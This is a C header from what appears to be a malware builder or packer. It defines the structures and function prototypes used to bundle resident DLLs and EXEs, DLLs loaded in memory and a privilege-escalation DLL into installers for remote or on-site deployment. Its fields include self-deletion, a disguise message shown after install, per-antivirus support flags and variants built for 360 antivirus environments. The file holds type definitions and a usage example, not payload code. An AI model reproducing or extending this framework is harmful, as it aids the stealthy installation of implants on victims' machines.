/****************************************************************
 * Module:
 *      PacketType.h
 *
 * Author:
 *		xieb(157360050@qq.com)
 *
 * Note:
 *		打包需要安装的文件时使用的一些数据结构及描述
 *
 * Example:
 *      生成时的调用示例
    
	HMODULE hMod = LoadLibrary(L"..\\Support\\Plat1Gui.dll");
	LPPACKETINIT lpfnPacketInit ;
	LPPLAT1SHOWGUI lpfnPlat1ShowGui;
	PACKET_FUNCTION_POINTER packetFunc;
	PLAT_FILE_TYPE platFileType;

	if ( hMod )
	{
		lpfnPacketInit = (LPPACKETINIT)GetProcAddress(hMod, PLAT1_GUI_FUNC1);
		lpfnPlat1ShowGui = (LPPLAT1SHOWGUI)GetProcAddress(hMod, PLAT1_GUI_FUNC2);
		if ( lpfnPacketInit && lpfnPlat1ShowGui )
		{
			lpfnPacketInit(&packetFunc);

			platFileType.b64Bit = FALSE;
			platFileType.dwFileType = PLAT_FILE_TYPE_3;
			platFileType.productMark.dwProductID = TJ_E6000_ID;
			platFileType.productMark.dwPluginNumber = 0;
			platFileType.productMark.dwInternalVersion = 1;
			lstrcpyW(platFileType.wzLocalFileName, L"E:\\SVN\\Plat1\\Debug\\abc.dll_");
			lstrcpyW(platFileType.wzTargetFileName, L"Test.dat");

			packetFunc.lpAddFile(&platFileType);

			lpfnPlat1ShowGui(NULL, TJ_T5000_ID);
		}
		FreeLibrary(hMod);
	}
 *
 *
 */
#ifndef _PACKET_TYPE_H_
#define _PACKET_TYPE_H_

#include "AdkPrecomp.h"

// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// 与打包相关的部分

// 现场安装时，对安装程序的行为控制
//
typedef struct _INST_CTL_A {

	BOOL      bShowSuccess;                      // 在安装成功后，是否弹出提示信息
	BOOL      bDelSelf;                          // 自毁
	BOOL      bOnlineNow;
	DWORD     dwNoSupportAntiVirus;              // 不支持的杀毒软件
	DWORD     dwSupportAntiVirus;                // 支持的杀毒软件
	WCHAR     wzIconFile[MAX_PATH];              // 图标文件
	WCHAR     wzNoteFile[MAX_PATH];              // 提示信息文件
	BOOL	  bIsBit32;							 // 目标系统是否是32位

}  INST_CTL_A, *LPINST_CTL_A;

// 远程安装时，对安装程序的行为控制
//
typedef struct _INST_CTL_N {

	WCHAR     wzNoteFile[MAX_PATH];              // 安装后的伪装提示信息
	WCHAR     wzIconFile[MAX_PATH];              // 图标文件
	BOOL      bDelSelf;                          // 自毁
	BOOL      bOnlineNow;
	DWORD     dwNoSupportAntiVirus;              // 不支持的杀毒软件
	DWORD     dwSupportAntiVirus;                // 支持的杀毒软件
	BOOL	  bIsBit32;							 // 目标系统是否是32位

}  INST_CTL_N, *LPINST_CTL_N;

// 打包时用到的文件类型定义
//
#define PLAT_FILE_TYPE_0        0                // 无特殊含义
#define PLAT_FILE_TYPE_1        1                // 驻留DLL
#define PLAT_FILE_TYPE_2        2                // 驻留EXE
#define PLAT_FILE_TYPE_3        3                // 以内存加载方式加载，并由驻留模块加载
#define PLAT_FILE_TYPE_4        4                // 内存方式加载的DLL，但不需要驻留模块加载
#define PLAT_FILE_TYPE_SIGDLL	5				 // 有数字签名的DLL
#define PLAT_FILE_TYPE_SIGEXE	6				 // 有数字签名的EXE
#define PLAT_FILE_TYPE_7        7                // 用于权限提升的DLL
#define PLAT_FILE_TYPE_8        8                // 安装用的DLL

// 关于产品的定义
//
typedef struct _PRODUCT_MARK {

	DWORD   dwProductID;                         // 产品ID，见TJ_*_ID定义
	DWORD   dwPluginNumber;                      // 产品自身如果有多个功能文件，可自定义功能文件编号
	DWORD   dwInternalVersion;                   // 内部版本号，以整数标识，方便升级时进行版本比对

} PRODUCT_MARK, *LPPRODUCT_MARK;

// 与*Packet*.ini文件对应的数据结构
//
typedef struct _PLAT_FILE_TYPE
{
	PRODUCT_MARK productMark;
	DWORD        dwFileType;                     // 与*Packet*.ini中的FileType对应，取值为PLAT_FILE_TYPE_*
	BOOL         b64Bit;                         // 与*Packet*.ini中的b64Bit对应
	WCHAR        wzLocalFileName[MAX_PATH];      // 与*Packet*.ini中的LocalFileName对应
	WCHAR        wzTargetFileName[MAX_PATH];     // 与*Packet*.ini中的TargetFileName对应
	PBYTE		 filemem;//可以为空，当该参数为空时会自动从文件中读取
	DWORD		 dwfilesize;//可以为空，当该参数为空时会自动从文件中读取
}  PLAT_FILE_TYPE, *LPPLAT_FILE_TYPE;

// 打包用的DLL函数原型
//
typedef BOOL (WINAPI *LPADDFILE)(LPPLAT_FILE_TYPE lpPlatFileType);    // 增加文件
typedef BOOL (WINAPI *LPPACKETN)(LPWSTR lpwzOutputPath, LPINST_CTL_N lpInstCtlN);    // 用于远程安装的输出，输出到目录
typedef BOOL (WINAPI *LPPACKETN360)(LPWSTR lpwzOutputPath, LPINST_CTL_N lpInstCtlN); // 远程360
typedef BOOL (WINAPI *LPPACKETA)(LPWSTR lpwzOutputPath, LPINST_CTL_A lpInstCtlA);    // 用于现场生成时的输出
typedef BOOL (WINAPI *LPPACKETA360)(LPWSTR lpwzOutputPath, LPINST_CTL_A lpInstCtlA); // 现场360
typedef BOOL (WINAPI *LPCANCEL)();                                    // 取消

typedef struct _PACKET_FUNCTION_POINTER {

	LPADDFILE         lpAddFile;
	LPPACKETN         lpPacketN;
	LPPACKETN360      lpPacketN360;
	LPPACKETA         lpPacketA;
	LPPACKETA360      lpPacketA360;
	LPCANCEL          lpCancel;

} PACKET_FUNCTION_POINTER, *LPPACKET_FUNCTION_POINTER;

// 打包用的DLL导出的函数原型
//
typedef BOOL (WINAPI *LPPACKETINIT)(LPPACKET_FUNCTION_POINTER lpFunctionPointer);

// 打包用的DLL文件名
//
#define PACKET_DLL_A            L"PacketA.dll"    // 现场安装时使用的打包DLL文件名
#define PACKET_DLL_A_360        L"PacketA360.dll" // 现场安装时使用的支持360环境的打包DLL文件名
#define PACKET_DLL_N            L"PacketN.dll"    // 远程安装时使用的打包DLL文件名
#define PACKET_DLL_N_360        L"PacketN360.dll" // 远程安装时使用的支持360环境的打包DLL文件名

// 导出函数名
//
#define PACKET_A_INIT           "PacketAInit"
#define PACKET_N_INIT           "PacketNInit"

// 打包相关部分结束
// ------------------------------------------------------------------------------------------------

// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// 与生成界面相关的部分

// 导出函数名
//
#define PLAT1_GUI_FUNC1         "Plat1GuiInit"
#define PLAT1_GUI_FUNC2         "Plat1ShowGui"

// //////////////////////////////////////////////////////////////////
// 用于用户控制生成选项的导出函数原型
//
typedef VOID (WINAPI *LPPLAT1SHOWGUI)(HWND hWnd, DWORD dwProductId);

// 与生成界面相关的部分结束
// ------------------------------------------------------------------------------------------------


#endif // !_PACKET_TYPE_H_
